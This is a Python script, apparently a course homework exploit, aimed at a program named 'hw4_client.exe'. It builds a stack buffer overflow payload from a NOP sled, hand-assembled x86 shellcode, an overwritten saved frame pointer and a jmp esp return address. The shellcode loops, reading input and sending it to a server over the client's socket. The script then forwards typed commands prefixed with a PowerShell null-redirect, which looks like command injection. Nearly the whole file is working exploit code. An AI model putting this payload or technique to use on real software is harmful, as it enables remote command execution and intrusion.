import os, sys
from subprocess import Popen, PIPE
from time import sleep


#setting up input
jmp_esp_addr = 0x62502028#0x625019BD
f_arr = bytearray()
f_arr += b"archer\nVGPF24IDKK45SBP3\nPEEK\n"
mystr = [ord(i) for i in "stop nirrrr"]
mystr.append(0)
f_arr += bytes(mystr)
sc_arr = bytearray()
sc_arr += b"\x8B\x5D\x08\xBF\x80\x80\x50\x62"# mov ebx, [ebp+8] aka pointer to socket fd
sc_arr += b"\x89\xE5"# move ebp, esp
sc_arr += b"\x81\xEC\x00\x04\x00\x00"
sc_arr += b"\xB9\x68\x61\x50\x62"# push "%s", mov "%s" ptr to ecx
sc_arr += b"\x54\x51\xE8\x23\x6F\xF0\x61" #calling scanf
sc_arr += b"\x59\x59\x90\x90\x90\x90\x90\x6A\x00\x57\x51\x6A\x07\x53\xE8\xCE\x3B\xF0\x61\x89\xEC\x90" # calling send_server
sc_arr += b"\xE9\xD3\xFF\xFF\xFF" #jmp to start of our code (loop)
f_arr += (bytes([0x90]*(16300-len(mystr) - len(sc_arr)))) # TODO: change back to 0
f_arr += (sc_arr)
f_arr += (0x5FFD7C.to_bytes(4, "little")) # old ebp
f_arr += (jmp_esp_addr.to_bytes(4, "little"))
f_arr += (b"\xE9\xBC\xFF\xFF\xFF") #jmp to start of our code (first time)
f_arr += (b"\n")


p = Popen('hw4_client.exe', stdin=PIPE)
p.stdin.write(f_arr)
p.stdin.flush()
inp_str = input()
while inp_str != "exit": # change to !="exit"
    s = ". > $null; " + inp_str + "\n"
    p.stdin.write(s.encode())
    p.stdin.flush()
    inp_str = input()


p.kill()



